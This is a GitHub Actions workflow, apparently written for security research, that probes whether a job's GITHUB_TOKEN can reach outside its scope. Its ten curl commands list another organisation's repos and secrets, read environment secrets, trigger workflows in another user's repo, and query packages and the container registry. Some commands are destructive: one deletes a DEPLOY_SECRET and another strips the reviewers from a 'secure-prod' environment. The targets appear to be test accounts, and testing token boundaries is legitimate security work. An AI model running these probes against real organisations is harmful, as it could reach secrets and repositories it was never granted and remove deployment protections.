name: GITHUB_TOKEN Scope Probe
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
  packages: read
  issues: read
  pull-requests: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe GITHUB_TOKEN boundaries
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== 1. Can access other repos in org? ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/orgs/victim-test-org-bb/repos" | tail -5

          echo ""
          echo "=== 2. Can access org secrets? ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/orgs/victim-test-org-bb/actions/secrets" | tail -3

          echo ""
          echo "=== 3. Can access other user repo? ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/s2ongmo/actions-bypass-test/contents/" | tail -3

          echo ""
          echo "=== 4. Can dispatch in other repo? ==="
          curl -s -w "\nHTTP:%{http_code}" -X POST \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/s2ongmo/actions-bypass-test/dispatches" \
            -d '{"event_type":"probe"}' | tail -3

          echo ""
          echo "=== 5. Can read env secrets API? ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/victim-test-org-bb/secret-target/environments/secure-prod/secrets" | tail -3

          echo ""
          echo "=== 6. Can create/delete env secret? ==="
          curl -s -w "\nHTTP:%{http_code}" -X DELETE \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/victim-test-org-bb/secret-target/environments/secure-prod/secrets/DEPLOY_SECRET" | tail -3

          echo ""
          echo "=== 7. Can modify environment? ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/victim-test-org-bb/secret-target/environments/secure-prod" \
            -d '{"reviewers":[]}' | tail -3

          echo ""
          echo "=== 8. JWT token claims ==="
          echo "$GH_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || echo "Not a JWT"

          echo ""
          echo "=== 9. Can access npm packages of other user? ==="
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/users/s2ongmo/packages?package_type=npm" | tail -3

          echo ""
          echo "=== 10. Can access GitHub Container Registry? ==="
          TOKEN_B64=$(echo -n "x-access-token:$GH_TOKEN" | base64)
          curl -s -w "\nHTTP:%{http_code}" \
            -H "Authorization: Basic $TOKEN_B64" \
            "https://ghcr.io/v2/victim-test-org-bb/secret-target/tags/list" | tail -3
